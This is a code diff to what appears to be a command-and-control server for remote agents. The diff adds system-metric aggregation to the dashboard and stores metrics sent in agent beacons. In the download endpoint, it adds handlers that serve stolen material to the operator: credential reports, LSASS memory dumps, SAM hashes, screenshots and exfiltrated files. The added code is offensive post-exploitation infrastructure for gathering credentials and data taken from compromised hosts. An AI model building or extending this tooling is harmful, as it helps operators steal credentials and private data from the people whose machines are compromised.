@@ -140,23 +140,72 @@ def get_dashboard_data():
         dashboard_data['summary']['total_vulnerabilities'] = dashboard_data['summary'].get('total_vulnerabilities', 0)
         dashboard_data['summary']['overall_risk_score'] = dashboard_data['summary'].get('overall_risk_score', 0)
         
-        # Add agent activity data
+        # Calculate aggregated metrics from all agents
+        total_cpu_usage = 0
+        total_memory_usage = 0
+        total_disk_usage = 0
+        total_processes = 0
+        network_activity = {'sent': 0, 'received': 0}
         agent_activity = []
         task_count = 0
+        
         for agent_id, agent_data in agents.items():
+            metrics = agent_data.get('metrics', {})
+            
+            # Aggregate system metrics
+            total_cpu_usage += metrics.get('cpu_usage', 0)
+            total_memory_usage += metrics.get('memory_usage', 0)
+            total_disk_usage += metrics.get('disk_usage', 0)
+            total_processes += metrics.get('process_count', 0)
+            network_activity['sent'] += metrics.get('network_sent', 0)
+            network_activity['received'] += metrics.get('network_recv', 0)
+            
+            # Individual agent activity
             activity = {
                 'agent_id': agent_id,
                 'hostname': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
                 'last_seen': agent_data.get('last_seen', 'Never'),
                 'status': agent_data.get('status', 'Unknown'),
                 'platform': agent_data.get('system_info', {}).get('platform', 'Unknown'),
-                'task_count': len(agent_data.get('results', {}))
+                'task_count': len(agent_data.get('results', {})),
+                'metrics': metrics
             }
             agent_activity.append(activity)
             task_count += activity['task_count']
         
+        # Calculate averages
+        agent_count = len(agents) if len(agents) > 0 else 1
+        
+        # Enhanced dashboard data
         dashboard_data['agent_activity'] = agent_activity
         dashboard_data['summary']['total_tasks'] = task_count
+        dashboard_data['summary']['avg_cpu_usage'] = total_cpu_usage / agent_count
+        dashboard_data['summary']['avg_memory_usage'] = total_memory_usage / agent_count
+        dashboard_data['summary']['avg_disk_usage'] = total_disk_usage / agent_count
+        dashboard_data['summary']['total_processes'] = total_processes
+        dashboard_data['summary']['network_activity'] = network_activity
+        
+        # Create some meaningful "security events" from agent activity
+        security_events = []
+        for agent_data in agents.values():
+            metrics = agent_data.get('metrics', {})
+            if metrics.get('cpu_usage', 0) > 80:
+                security_events.append({
+                    'type': 'High CPU Usage',
+                    'severity': 'Medium',
+                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
+                    'description': f"CPU usage at {metrics.get('cpu_usage', 0):.1f}%"
+                })
+            if metrics.get('memory_usage', 0) > 85:
+                security_events.append({
+                    'type': 'High Memory Usage', 
+                    'severity': 'Medium',
+                    'agent': agent_data.get('system_info', {}).get('hostname', 'Unknown'),
+                    'description': f"Memory usage at {metrics.get('memory_usage', 0):.1f}%"
+                })
+        
+        dashboard_data['security_events'] = security_events
+        dashboard_data['summary']['security_events_count'] = len(security_events)
         
         return jsonify({
             'status': 'success',
@@ -427,11 +476,15 @@ def agent_beacon():
                 # Update system info if provided
                 if 'system_info' in data:
                     agents[agent_id]['system_info'] = data.get('system_info')
+                # Update metrics if provided
+                if 'metrics' in data:
+                    agents[agent_id]['metrics'] = data.get('metrics')
                 logging.debug(f"Updated existing agent {agent_id}: {agents[agent_id]}")
             else:
                 agents[agent_id] = {
                     'agent_id': agent_id,
                     'system_info': data.get('system_info'),
+                    'metrics': data.get('metrics', {}),
                     'status': data.get('status'),
                     'last_seen': timestamp,
                     'results': {}
@@ -660,8 +713,80 @@ def download_result(task_id):
             entry = agent_results[task_id]
             result = entry.get('result', {})
             try:
+                # Debug: Log the result structure for troubleshooting
+                logging.debug(f"Download request for task {task_id}")
+                logging.debug(f"Result type: {type(result)}")
+                logging.debug(f"Result keys: {list(result.keys()) if isinstance(result, dict) else 'N/A'}")
+                if isinstance(result, dict) and 'result' in result:
+                    logging.debug(f"Inner result keys: {list(result['result'].keys()) if isinstance(result['result'], dict) else 'N/A'}")
+                
+                # Handle credential dump download  
+                if isinstance(result, dict):
+                    # Priority 1: Check for report_file (comprehensive credential report)
+                    report_file = None
+                    if 'report_file' in result:
+                        report_file = result['report_file']
+                    elif 'result' in result and isinstance(result['result'], dict) and 'report_file' in result['result']:
+                        report_file = result['result']['report_file']
+                    
+                    if report_file and 'file_data' in report_file:
+                        file_data = base64.b64decode(report_file['file_data'])
+                        filename = report_file.get('filename', f'credential_report_{task_id}.json')
+                        return Response(file_data, mimetype='application/json', headers={
+                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
+                        })
+                    
+                    # Priority 2: Check for LSASS dump in nested result data
+                    lsass_data = None
+                    if 'data' in result and 'lsass_dump' in result.get('data', {}):
+                        lsass_data = result['data']['lsass_dump']
+                    elif 'result' in result and isinstance(result['result'], dict) and 'data' in result['result'] and 'lsass_dump' in result['result'].get('data', {}):
+                        lsass_data = result['result']['data']['lsass_dump']
+                    
+                    if lsass_data and 'file_data' in lsass_data:
+                        file_data = base64.b64decode(lsass_data['file_data'])
+                        filename = lsass_data.get('file', f'lsass_dump_{task_id}.bin')
+                        return Response(file_data, mimetype='application/octet-stream', headers={
+                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
+                        })
+                    
+                    # Priority 3: If credential dump task, create a JSON download from available data
+                    if ('credentials_dump' in task_id.lower() or 
+                        (result.get('type') == 'credentials_dump') or
+                        ('result' in result and isinstance(result['result'], dict) and 'data' in result['result'] and 
+                         any(key in result['result']['data'] for key in ['windows_credentials', 'sam_hashes', 'lsass_dump']))):
+                        
+                        # Create JSON download from existing data
+                        import json
+                        from datetime import datetime
+                        json_data = json.dumps(result, indent=2, default=str)
+                        filename = f'credentials_{task_id}_{datetime.now().strftime("%Y%m%d")}.json'
+                        return Response(json_data, mimetype='application/json', headers={
+                            'Content-Disposition': f'attachment;filename={filename}'
+                        })
+                    
+                    # Priority 4: Check for any file_data in the result (general case)
+                    if 'data' in result and 'file_data' in result.get('data', {}):
+                        file_data = base64.b64decode(result['data']['file_data'])
+                        filename = result['data'].get('filename', f'file_{task_id}.bin')
+                        return Response(file_data, mimetype='application/octet-stream', headers={
+                            'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
+                        })
+                
                 # Handle image download
                 if isinstance(result, dict):
+                    # Handle screenshot format: result['result']['image'] and result['result']['format']
+                    if 'result' in result and isinstance(result['result'], dict):
+                        inner_result = result['result']
+                        if 'image' in inner_result and 'format' in inner_result:
+                            file_data = base64.b64decode(inner_result['image'])
+                            file_format = inner_result['format']
+                            filename = f'screenshot_{task_id}.{file_format}'
+                            mimetype = f'image/{file_format.lower()}'
+                            return Response(file_data, mimetype=mimetype, headers={
+                                'Content-Disposition': f'attachment;filename={filename}'
+                            })
+                    
                     # Handle file result where result['data'] is a dict (agent file exfil)
                     if 'data' in result and isinstance(result['data'], dict) and 'data' in result['data']:
                         file_data = base64.b64decode(result['data']['data'])
@@ -672,6 +797,8 @@ def download_result(task_id):
                         return Response(file_data, mimetype=mimetype, headers={
                             'Content-Disposition': f'attachment;filename={os.path.basename(filename)}'
                         })
+                    
+                    # Handle direct image format: result['data'] and result['format']
                     if 'data' in result and result.get('format') in ['png', 'jpg', 'jpeg', 'gif', 'bmp']:
                         file_data = base64.b64decode(result['data'])
                         file_format = result.get('format', 'bin')
